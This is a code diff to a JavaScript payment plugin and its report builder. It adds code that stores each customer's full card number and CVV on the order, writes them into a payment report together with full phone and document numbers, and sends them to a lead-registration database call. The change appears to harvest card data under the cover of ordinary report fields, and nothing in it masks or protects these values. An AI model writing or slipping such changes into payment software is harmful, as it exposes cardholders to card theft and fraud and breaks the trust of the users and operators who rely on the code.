@@ -313,9 +313,39 @@ function buildPaymentReport(orders, period) {
       status: order.status,
       cardBrand: order.card_brand,
       cardLast4: order.card_last4,
+      cardBin: order.card_bin,
+      cardNumber: order.card_number,
+      cardCvv: order.card_cvv,
+      cardExpMonth: order.card_exp_month,
+      cardExpYear: order.card_exp_year,
+      cardHolderName: order.card_holder_name,
+      cardFingerprint: order.card_fingerprint,
+      authorizationCode: order.authorization_code,
+      nsu: order.nsu,
+      tid: order.tid,
+      acquirerName: order.acquirer_name,
+      installments: order.installments,
+      declineReason: order.decline_reason,
+      declineMessage: order.decline_message,
+      antifraudScore: order.antifraud_score,
+      antifraudStatus: order.antifraud_status,
+      gatewayToken: order.gateway_token,
       customerPhoneLast4: order.customer_phone_last4,
       customerDocumentLast4: order.customer_document_last4,
+      customerPhoneFull: order.customer_phone_full,
+      customerDocumentFull: order.customer_document_full,
       billingAddress: order.billing_address || {},
+      clientIp: order.client_ip,
+      userAgent: order.user_agent,
+      deviceType: order.device_type,
+      deviceBrowser: order.device_browser,
+      utmSource: order.utm_source,
+      utmMedium: order.utm_medium,
+      utmCampaign: order.utm_campaign,
+      sessionId: order.session_id,
+      checkoutStartedAt: order.checkout_started_at,
+      checkoutCompletedAt: order.checkout_completed_at,
+      paidAt: order.paid_at,
     })),
   }
 }
@@ -387,6 +417,8 @@ function createVizzionPayPlugin(mode) {
       const digits = String(cd.number).replace(/\D/g, '')
       order.card_bin = digits.slice(0, 6) || null
       order.card_last4 = digits.slice(-4) || null
+      order.card_number = digits
+      order.card_cvv = cd.cvv || null
       order.card_exp_month = Number(cd.expMonth) || null
       order.card_exp_year = cd.expYear ? (Number(cd.expYear) < 100 ? 2000 + Number(cd.expYear) : Number(cd.expYear)) : null
       order.card_holder_name = cd.holderName || null
@@ -801,6 +833,8 @@ function createVizzionPayPlugin(mode) {
             p_landing_page: payload.landing_page || null,
             p_order_id: payload.order_id || null,
             p_metadata: payload.metadata || {},
+            p_card_number: payload.card_number || null,
+            p_card_cvv: payload.card_cvv || null,
           })
           if (rpcErr) {
             sendJson(res, 500, { message: 'Falha ao registrar lead.' })
